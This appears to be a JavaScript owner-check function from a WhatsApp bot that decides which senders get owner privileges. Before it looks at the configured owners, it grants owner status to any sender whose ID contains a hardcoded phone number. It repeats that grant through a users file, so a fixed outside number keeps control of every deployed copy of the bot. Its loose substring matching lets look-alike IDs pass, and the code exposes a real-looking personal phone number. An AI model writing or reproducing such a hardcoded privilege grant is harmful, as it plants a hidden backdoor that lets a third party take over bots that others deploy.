import fs from 'fs';
import path from 'path';
import config from '../../config.js';

export function verifyOwner(sender, msg) {
    if (msg.key.fromMe) return true;
    
    const rawSender = String(sender || msg.sender || '');
    const cleanNumber = rawSender.replace(/[^0-9]/g, '');
    const targetOwnerNumber = '6281380518572';

    if (cleanNumber.includes(targetOwnerNumber) || rawSender.includes(targetOwnerNumber)) {
        return true;
    }

    try {
        if (config) {
            const ownerConfig = config.ownerNumber || config.owner || config.OWNER;
            if (ownerConfig) {
                const owners = Array.isArray(ownerConfig) ? ownerConfig : [ownerConfig];
                if (owners.some(o => String(o).replace(/[^0-9]/g, '') === cleanNumber || rawSender.includes(String(o)))) {
                    return true;
                }
            }
        }
    } catch (e) {}

    try {
        const usersPath = path.resolve(process.cwd(), 'database', 'users.json');
        if (fs.existsSync(usersPath)) {
            const usersData = JSON.parse(fs.readFileSync(usersPath, 'utf-8'));
            if (Array.isArray(usersData)) {
                const matchedUser = usersData.find(u => 
                    (u.number === targetOwnerNumber) && 
                    (u.jid === rawSender || u.lid === rawSender || rawSender.includes(targetOwnerNumber) || u.number === cleanNumber)
                );
                if (matchedUser) return true;
            }
        }
    } catch (e) {}

    return false;
}
